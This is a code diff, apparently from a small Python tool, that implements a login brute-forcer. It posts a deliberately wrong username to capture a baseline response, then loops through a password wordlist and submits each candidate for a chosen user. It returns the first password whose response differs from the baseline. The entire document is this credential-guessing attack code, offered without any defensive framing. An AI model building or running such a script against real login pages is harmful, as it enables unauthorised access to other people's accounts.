@@ -49,7 +49,23 @@ def make_pass_call(url, user, password, headers, cookies):
     )
 
 def password_user(url, user, password_file_list, headers, cookies):
-    pass
+    demarcation_response = post(
+        url,
+        data={'username': 'obviously_non_existent_user', 'password': 'asdf'},
+        headers=headers,
+        cookies=cookies
+    )
+    with Path(password_file_list).open('r') as file:
+        for password in file.readlines():
+            res = make_pass_call(
+                url,
+                user=user,
+                password=password,
+                headers=headers,
+                cookies=cookies
+            )
+            if res.text != demarcation_response.text:
+                return password
 
 def main():
     pass
